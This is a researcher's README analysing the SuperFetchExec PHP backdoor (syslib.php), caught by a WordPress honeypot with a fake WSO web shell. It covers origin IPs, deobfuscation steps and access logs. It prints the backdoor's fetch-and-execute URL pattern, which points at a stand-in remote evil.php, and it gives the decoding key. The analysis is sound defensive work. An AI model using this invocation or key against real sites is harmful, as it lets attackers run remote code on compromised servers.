# syslib.php - SuperFetchExec malware

SuperFetchExec is a file transfer gateway.
Accessed by URL, something like:

    http://example.com/directory/syslib.php?superfetch+http://something.com/evil.php

SuperFetchExec would try to download `evil.php` from
`http://something.com` to the compromised macine on which it runs.
Then SuperFetchExec would try to execute `evil.php`

UPDATE 2018-08-13: my WSO honey pot got a [new instance](178.137.88.27-2018-08-13a)
of this code. Same IP address, same everything. Why doesn't somebody shut this
crap down?

## Origin

### IP Address 178.137.88.27

178.137.88.27 &rarr; 178-137-88-27.broadband.kyivstar.net

kyivstar.net appears to be a ISP in Kiev, Ukraine.

178.137.88.27 geolocates to downtown Lviv, Ukraine.

`p0f3` says that 178.137.88.27 is "Windows 7 or 8", sort of consistent with the user agent string it used.

### Download

Someone intended to download this code via the "FilesMan" action, "uploadFile"
sub-action of a WSO web shell they thought was installed in
my WordPress honey pot. I have a fake WSO web shell, so I just caught the file.
The file was intended to be named `syslib.php`

## Decoding

1. `~/src/php/reverse-php-malware/pp.php 178.137.88.27WimZ3KYUg72jOWoTIndRKAAAAAM.0.file > f1.php` , pretty-print the original.
2. Hand-edit `f1.php`, change "eval" to "print", so that I can execute it
3. `php f1.php > dc1.php`, add "<?php" to `dc1.php`
4.  `~/src/php/reverse-php-malware/pp.php dc1.php > f2.php`, pretty-print the first level de-obfuscated code.
5. Hand-edit `f2.php` into `dc2.php`, so that I can safely execute it.
6. `php dc2.php > puzzling.dat`

File `puzzling.dat` is the same xor-encoded PHP source as used in 
[xor-decoding](https://github.com/bediger4000/xor-decoding) as an
example of how to decode just such a file.

See that repo for an explanation of how to get the key to
decode `puzzling.dat`.
The key string is "SjJVkE6rkRYj", which is the value of `$k` that code
in `f2.php` tries to get out of POST or GET parameters.

I've [reverse-engineered](decoder) the first-stage encoding that
steps 2 and 3 above just gloss over.

## Analysis

Apparently this is the "SuperFetchExec"
malware, [an early reference](http://pastebin.com/z53aByWX)
has it around since 2012, using
the [same key](https://news.ycombinator.com/item?id=3433505).
How does this same stupid thing get used for 5+ years?

To get to the SuperFetchExec code:

    php decoder.php > superfetchexec.php

Looks like someone tried to execute `syslib.php`:

    /var/log/httpd/access_log.3:176.119.3.201 - - [07/Dec/2017:13:33:31 -0700] "GET /wordpress//wp-content/plugins/revslider/temp/update_extract/revslider/syslib.php HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Goooglebot/2.1; +http://www.google.com/bot.html)"
    /var/log/httpd/access_log.3:176.119.3.201 - - [07/Dec/2017:13:33:43 -0700] "GET /wordpress//wp-content/plugins/revslider/temp/update_extract/revslider/syslib.php HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Goooglebot/2.1; +http://www.google.com/bot.html)"

That access happened almost 50 minutes after the installation attempt. Looks like both attempts tried
to get the Linux `hostname` command to execute locally.
See files `176.119.3.201Wimlp1Qt96SxMyTU5Bip4QAAAAE.wso.scans` and `176.119.3.201Wimlm6YUg72jOWoTIndRSQAAAAM.wso.scans`
for exact details. My fake WSO left those files behind as a record.

Oddly DNS has 176.119.3.201 &rarr; mail.countrypost.top, which is
registered to a Philadelphia USA address. `whois` has 176.119.3.201
in VSERVER-NET, in AS58271 - VSERVER-AS, a Donetsk Ukraine ISP.

`p0f3` doesn't have a guess about the OS used by 176.119.3.201, saying:
`raw_sig=4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df:0`
